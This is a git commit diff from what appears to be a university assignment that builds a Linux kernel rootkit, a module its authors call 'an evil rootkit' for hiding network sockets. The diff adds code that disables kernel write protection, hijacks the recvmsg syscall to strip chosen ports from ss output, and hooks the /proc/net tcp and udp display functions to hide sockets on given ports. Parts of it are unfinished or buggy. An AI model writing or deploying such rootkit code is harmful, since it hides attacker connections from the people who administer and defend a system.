ab051696e29e9c873adb9af831fdf039033b60ff
Nedko Stefanov Nedkov <nedko.stefanov.nedkov@gmail.com>
2015-11-23 13:58:46 +0100

    Functionality for socket hiding done. Refactoring and documentation missing

--- Assignment_6/socket_masker.c
+++ Assignment_6/socket_masker.c
@@ -29,48 +29,93 @@
 /*******************************************************************************/
 
 #include <linux/module.h>		/* Needed by all kernel modules */
-#include <linux/syscalls.h>		/* Needed for __NR_read */
-#include <linux/list.h>			/* Needed for linked list interface */
+#include <linux/syscalls.h>		/* Needed for __NR_recvmsg */
+#include <net/tcp.h>
+#include <net/udp.h>
+#include <linux/inet_diag.h>
+#include <linux/types.h>
 
 #include "socket_masker.h"
 #include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */
 
 
 MODULE_LICENSE("GPL");
+MODULE_DESCRIPTION("An evil rootkit. It hides sockets :)") ;
+MODULE_VERSION("0.1");
+MODULE_AUTHOR("Matei<mateipavaluca@yahoo.com>") ;
+MODULE_AUTHOR("Nedko<nedko.stefanov.nedkov@gmail.com>");
+
+module_param_array(tcp_ports, int, &tcp_ports_count, 0);
+MODULE_PARM_DESC(tcp_ports, "TCP ports");
+module_param_array(udp_ports, int, &udp_ports_count, 0);
+MODULE_PARM_DESC(udp_ports, "UDP ports");
+module_param_array(tcp6_ports, int, &tcp6_ports_count, 0);
+MODULE_PARM_DESC(tcp6_ports, "TCPv6 ports");
+module_param_array(udp6_ports, int, &udp6_ports_count, 0);
+MODULE_PARM_DESC(udp6_ports, "UDPv6 ports");
 
 
 /* Initialization function which is called when the module is
-   insmoded into the kernel. It replaces the read() syscall. */
+   insmoded into the kernel. It ... */
 static int __init socket_masker_start(void)
 {
-	disable_write_protect_mode();
+	int i;
 
-	/* Store original read syscall address */
-	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
-	original_read_syscall = (void *) syscall_table[__NR_read];
+	if (!tcp_ports_count && !udp_ports_count && !tcp6_ports_count && !udp6_ports_count) {
+		PRINT("insmod socket_masker.ko [tcp_ports=port1,port2,...] [udp_ports=port1,port2,...] [tcp6_ports=port1,port2,...] [udp6_ports=port1,port2,...]");
+		/* A non 0 return value means init_module failed; module can't be loaded */
+		return -EINVAL;
+	}
 
-	/* Overwrite manipulated read syscall */
-	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;
+	// TODO: check if ports are in specific set [1024...]
 
-	enable_write_protect_mode();
+	if (tcp_ports_count) {
+		disable_write_protect_mode();
+
+		/* Store original read recvmsg address */
+		syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
+		original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];
+
+		/* Overwrite manipulated read syscall */
+		syscall_table[__NR_recvmsg] = (unsigned long *) my_recvmsg_syscall;
+
+		enable_write_protect_mode();
+	}
+
+	hide_sockets();
+
+	for (i=0 ; i<tcp_ports_count ; i++)
+		printk(KERN_INFO "socket_masker rootkit: tcp_ports[%d] = %d\n", i, tcp_ports[i]);
+
+	for (i=0 ; i<udp_ports_count ; i++)
+		printk(KERN_INFO "socket_masker rootkit: udp_ports[%d] = %d\n", i, udp_ports[i]);
+
+	for (i=0 ; i<tcp6_ports_count ; i++)
+		printk(KERN_INFO "socket_masker rootkit: tcp6_ports[%d] = %d\n", i, tcp6_ports[i]);
+
+	for (i=0 ; i<udp6_ports_count ; i++)
+		printk(KERN_INFO "socket_masker rootkit: udp6_ports[%d] = %d\n", i, udp6_ports[i]);
 
 	PRINT("successfully inserted");
 
-	/* A non 0 return value means init_module failed; module can't be loaded */
 	return 0;
 }
 
 
 /* Cleanup function which is called just before module
-   is rmmoded. It restores the original read() syscall. */
+   is rmmoded. It restores the original recvmsg() syscall. */
 static void __exit socket_masker_end(void)
 {
-	disable_write_protect_mode();
+	if (tcp_ports_count) {
+		disable_write_protect_mode();
 
-	/* Restore original read syscall */
-	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;
+		/* Restore original recvmsg syscall */
+		syscall_table[__NR_recvmsg] = (unsigned long *) original_recvmsg_syscall;
 
-	enable_write_protect_mode();
+		enable_write_protect_mode();
+	}
+
+	unhide_sockets();
 
 	PRINT("successfully removed");
 
@@ -102,64 +147,232 @@ void enable_write_protect_mode(void)
 }
 
 
+/* our custom recvmsg, checks for the port number and hides it from ss */
 /* Function that replaces the original read syscall. In addition to what
    read syscall does, it also looks for two commands (`ping` and `unhide`).
    When `ping` is typed, it responds with `pong` in the kernel log. When
    `unhide` is typed, it makes the module visible again */
-asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
+asmlinkage ssize_t my_recvmsg_syscall(int sockfd, struct user_msghdr __user *msg, unsigned flags)
 {
 	long ret;
-	int matches_count;
+	long count;
+	struct nlmsghdr *nlh;
+	char *stream;
 	int i;
+	int found = 0;
+	int offset;
 
-	/* Call original read syscall */
-	ret = original_read_syscall(fd, buf, count);
+	PRINT("my_recvmsg_syscall");
+	nlh = (struct nlmsghdr*)(msg->msg_iov->iov_base);
+	
+	/* Call original recvmsg syscall */
+	ret = original_recvmsg_syscall(sockfd, msg, flags);
 
-	/* If the read was not from STDIN don't do anything */
-	if (fd != 0)
-		return ret;
+	// to hold the bytes remaining
+    count = ret;
+	found = 1;
 
-	/* Check if `ping` was typed */
-	if ((matches_count = count_matches(buf, "ping", &heartbeat_matched_so_far)) > 0)
-		for (i=0 ; i<matches_count ; i++)
-			/* Respond with `pong` in the kernel log */
-			PRINT("pong");
+	/* returns true if netlink message is suitable for parsing */
+	while (NLMSG_OK(nlh, count)) {
 
+		/* if port is not found, get the next nlmsghsr in multipart message */
+		if (found == 0)
+			nlh = NLMSG_NEXT(nlh, count);
+
+		stream = (char *) nlh;
+
+		if (hide(nlh)) {
+			found = 1;
+			offset = NLMSG_ALIGN((nlh)->nlmsg_len);
+			for (i=0 ; i<count ; ++i)
+				stream[i] = stream[i + offset];
+
+			ret -= offset;
+		} else
+			found = 0;
+	}
+	
 	return ret;
 }
 
 
-/* Count matches of specified command in the user input */
-int count_matches(char *buf, char *command, int *chars_matched_so_far)
+/*
+ * check if we need to hide this socket.
+ * only used by our manipulated recvmsg function.
+ */
+static int hide(struct nlmsghdr *nlh)
 {
-	int matches;
-	int i;
+	struct inet_diag_msg *r = NLMSG_DATA(nlh);
+	int port = ntohs(r->id.idiag_sport);
 
-	/* Match the command */
-	matches = i = 0;
-	while (i < strlen(buf)) {
-		if (command[(*chars_matched_so_far)++] != buf[i++])
-			*chars_matched_so_far = 0;
+	if (should_mask_socket("tcp", port))
+		return 1;
 
-		if (strlen(command) == *chars_matched_so_far) {
-			*chars_matched_so_far = 0;
-			matches++;
+	return 0;
+}
+
+
+/* Hide sockets... */
+void hide_sockets(void)
+{
+	struct proc_dir_entry *some;
+	struct rb_root proc;
+	struct rb_node *proc_node;
+	struct tcp_seq_afinfo *tcp_seq;
+	struct udp_seq_afinfo *udp_seq;
+
+	PRINT("hide_sockets");
+
+	proc = init_net.proc_net->subdir;
+	proc_node = rb_first(&proc);
+	printk(KERN_INFO "socket_masker rootkit: whateva (%p) \n", proc_node);
+	printk(KERN_INFO "socket_masker rootkit: whateva2 (%s) \n", init_net.proc_net->name);
+	while (proc_node != rb_last(&proc)) {
+		some = rb_entry(proc_node, struct proc_dir_entry, subdir_node);
+		PRINT(some->name);
+		if (tcp_ports_count && !strcmp(some->name, "tcp")) {
+			tcp_seq = some->data;
+			original_tcp_show = tcp_seq->seq_ops.show;
+			tcp_seq->seq_ops.show = my_tcp_show;
 		}
+
+		if (udp_ports_count && !strcmp(some->name, "udp")) {
+			udp_seq = some->data;
+			original_udp_show = udp_seq->seq_ops.show;
+			udp_seq->seq_ops.show = my_udp_show;
+		}
+
+		if (tcp6_ports_count && !strcmp(some->name, "tcp6")) {
+			tcp_seq = some->data;
+			original_tcp6_show = tcp_seq->seq_ops.show;
+			tcp_seq->seq_ops.show = my_tcp_show;
+		}
+
+		if (udp6_ports_count && !strcmp(some->name, "udp6")) {
+			udp_seq = some->data;
+			original_udp6_show = udp_seq->seq_ops.show;
+			udp_seq->seq_ops.show = my_udp_show;
+		}
+
+		proc_node = rb_next(proc_node);
+	}
+}
+
+
+/* Unhide sockets... */
+void unhide_sockets(void)
+{
+	struct proc_dir_entry *some;
+	struct rb_root proc;
+	struct rb_node *proc_node;
+	struct tcp_seq_afinfo *tcp_seq;
+	struct udp_seq_afinfo *udp_seq;
+
+	PRINT("unhide_sockets");
+
+	proc = init_net.proc_net->subdir;
+	proc_node = rb_first(&proc);
+	printk(KERN_INFO "socket_masker rootkit: whateva (%p) \n", proc_node);
+	printk(KERN_INFO "socket_masker rootkit: whateva2 (%s) \n", init_net.proc_net->name);
+	while (proc_node != rb_last(&proc)) {
+		some = rb_entry(proc_node, struct proc_dir_entry, subdir_node);
+		PRINT(some->name);
+		if (tcp_ports_count && !strcmp(some->name, "tcp")) {
+			tcp_seq = some->data;
+			tcp_seq->seq_ops.show = original_tcp_show;
+		}
+
+		if (udp_ports_count && !strcmp(some->name, "udp")) {
+			udp_seq = some->data;
+			udp_seq->seq_ops.show = original_udp_show;
+		}
+
+		if (tcp6_ports_count && !strcmp(some->name, "tcp6")) {
+			tcp_seq = some->data;
+			tcp_seq->seq_ops.show = original_tcp_show;
+		}
+
+		if (udp6_ports_count && !strcmp(some->name, "udp6")) {
+			udp_seq = some->data;
+			udp_seq->seq_ops.show = original_udp_show;
+		}
+
+		proc_node = rb_next(proc_node);
 	}
 
-	return matches;
 }
 
 
-/* Hide socket... */
-void hide_socket(int port)
+/*
+ * access the port number for udp and if it should be
+ * hidden then return 0, else return the original function
+ */
+static int my_tcp_show(struct seq_file *m, void *v)
 {
+	struct sock *sk;
+	struct inet_sock *inet;
+	int port;
+
+	PRINT("my_tcp_show");
+
+	if (SEQ_START_TOKEN == v)
+		return original_tcp_show(m, v);
+
+	sk = (struct sock *) v;
+	inet = inet_sk(sk);
+	port = ntohs(inet->inet_sport);
+
+	if (should_mask_socket("tcp", port))
+		return 0;
+
+	return original_tcp_show(m, v);
 }
 
 
-/* Unhide socket... */
-void unhide_module(int port)
+/*
+ * access the port number for udp and if it should be
+ * hidden then return 0, else return the original function
+ */
+static int my_udp_show(struct seq_file *m, void *v)
 {
+	struct sock *sk;
+	struct inet_sock *inet;
+	int port;
+
+	PRINT("my_udp_show");
+
+	if(SEQ_START_TOKEN == v)
+		return original_udp_show(m, v);
+
+	sk = (struct sock *) v;
+	inet = inet_sk(sk);
+	port = ntohs(inet->inet_sport);
+
+	if (should_mask_socket("udp", port))
+		return 0;
+
+	return original_udp_show(m, v);
+}
+
+
+/* Function that checks whether we need to mask the specified pid */
+int should_mask_socket(char *protocol, int port)
+{
+	int ports_count;
+	int *ports;
+	int i;
+
+	if (!strcmp(protocol, "tcp") && !strcmp(protocol, "udp"))
+		return 0;
+
+	ports_count = strcmp(protocol, "tcp") ? tcp_ports_count : udp_ports_count;
+	ports = strcmp(protocol, "tcp") ? tcp_ports : udp_ports;
+
+	for (i=0 ; i<ports_count ; i++)
+		if (ports[i] == port)
+			return 1;
+
+	return 0;
 }
 
 
--- Assignment_6/socket_masker.h
+++ Assignment_6/socket_masker.h
@@ -27,22 +27,73 @@
 /* Definition of macros */
 #define CR0_WRITE_PROTECT_MASK (1 << 16)
 #define PRINT(str) printk(KERN_INFO "socket_masker rootkit: %s\n", (str));
+#define PORTS_BUFFSIZE 8
 
 
 /* Definition of global variables */
+static int tcp_ports[PORTS_BUFFSIZE];
+static int tcp_ports_count = 0;
+static int udp_ports[PORTS_BUFFSIZE];
+static int udp_ports_count = 0;
+static int tcp6_ports[PORTS_BUFFSIZE];
+static int tcp6_ports_count = 0;
+static int udp6_ports[PORTS_BUFFSIZE];
+static int udp6_ports_count = 0;
 void **syscall_table;
-asmlinkage long (*original_read_syscall)(unsigned int, char __user *, size_t);
-int heartbeat_matched_so_far;
+asmlinkage ssize_t (*original_recvmsg_syscall)(int, struct user_msghdr __user *, unsigned);
+asmlinkage int (*original_tcp_show) (struct seq_file *, void *);
+asmlinkage int (*original_udp_show) (struct seq_file *, void *);
+asmlinkage int (*original_tcp6_show) (struct seq_file *, void *);
+asmlinkage int (*original_udp6_show) (struct seq_file *, void *);
 
 
 /* Declaration of functions */
 void disable_write_protect_mode(void);
 void enable_write_protect_mode(void);
 
-asmlinkage long my_read_syscall(unsigned int, char __user *, size_t);
-int count_matches(char *, char *, int *);
+asmlinkage ssize_t my_recvmsg_syscall(int, struct user_msghdr __user *, unsigned);
+static int hide(struct nlmsghdr *);
 
-void hide_socket(int port);
-void unhide_socket(int port);
+void hide_sockets(void);
+void unhide_sockets(void);
+
+static int my_tcp_show(struct seq_file *, void *);
+static int my_udp_show(struct seq_file *, void *);
+
+int should_mask_socket(char *, int);
+
+
+/* dirent structure */
+struct linux_dirent {   
+        unsigned long   d_ino;   
+        unsigned long   d_off;   
+        unsigned short  d_reclen;   
+        char            d_name[1];   
+};
+
+/* since this struct is no longer available in proc_fs, taken from fs/proc/internal.h */
+struct proc_dir_entry {
+		unsigned int low_ino;
+		umode_t mode;
+		nlink_t nlink;
+		kuid_t uid;
+		kgid_t gid;
+		loff_t size;
+		const struct inode_operations *proc_iops;
+		const struct file_operations *proc_fops;
+		struct proc_dir_entry *parent;
+		struct rb_root subdir;
+		struct rb_node subdir_node;
+		void *data;
+		atomic_t count;         /* use count */
+		atomic_t in_use;        /* number of callers into module in progress; */
+                          /* negative -> it's going away RSN */
+		struct completion *pde_unload_completion;
+		struct list_head pde_openers;   /* who did ->open, but not ->release */
+		spinlock_t pde_unload_lock; /* proc_fops checks and pde_users bumps */
+		u8 namelen;
+		char name[];
+};
+
 
 #endif
